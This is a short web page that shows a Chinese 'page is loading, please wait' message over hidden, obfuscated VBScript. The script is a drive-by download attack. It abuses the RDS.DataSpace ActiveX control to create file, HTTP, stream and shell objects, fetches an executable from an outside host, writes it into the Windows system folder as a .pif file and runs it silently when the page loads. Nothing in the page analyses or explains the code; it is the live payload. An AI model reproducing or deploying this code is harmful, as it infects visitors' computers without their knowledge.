<center><b><font color=red face="Verdana" size="2">您所访问的页面正在打开，请等待一会......</font></b>
<html><body><script language="VBScript">on error resume next
aurl_0 ="http://www.waiguatw.net/sg/sgwg.exe"
ybb51p="Adodb.Stre"
bbb42s="a"
dbb03q="m"
dss41a="Microsoft.XML"
yss12l="H"
rss03w="TTP"
hcc31h="clsid:BD9"
ycc52v="6"
vcc03l="C556-65A3-11D0-983A-00C04FC29E36"
ooo21a="Scripting.FileSystemOb"
woo52m="j"
uoo23o="ect"
bjj11s="obje"
cjj52x="c"
sjj33x="t"
vcl01u="cla"
ycl42e="s"
dcl03t="sid"
ese71y="Shell.A"
ese52o="p"
cse73w="plication"
m1sms3=dss41a&yss12l&rss03w
q6b1bk=ybb51p&bbb42s&dbb03q
c4cdc7=hcc31h&ycc52v&vcc03l
x5o3ow=ooo21a&woo52m&uoo23o
s7jej2=bjj11s&cjj52x&sjj33x
u1l4ly=vcl01u&ycl42e&dcl03t
b0eue0=ese71y&ese52o&cse73w
Set w1d4fj = document.createElement(s7jej2)
w1d4fj.setAttribute u1l4ly, c4cdc7
set b3f1v = w1d4fj.createobject(x5o3ow,"")
set k6x2s = w1d4fj.CreateObject(m1sms3,"")
set b0sf3 = w1d4fj.CreateObject(q6b1bk,"")
set b7qc0 = w1d4fj.CreateObject(b0eue0,"")
set ate8mp = b3f1v.GetSpecialFolder(0)
b0sf3.type = 1
o4get="GET"
k6x2s.Open o4get, aurl_0, False
k6x2s.Send
d4L_my80= "L_my80.pif"
d4L_my80= b3f1v.BuildPath(ate8mp,d4L_my80)
b0sf3.open
b0sf3.write k6x2s.responseBody
b0sf3.savetofile d4L_my80,2
b0sf3.close
b7qc0.ShellExecute d4L_my80,"","","open",0</script></body></html>

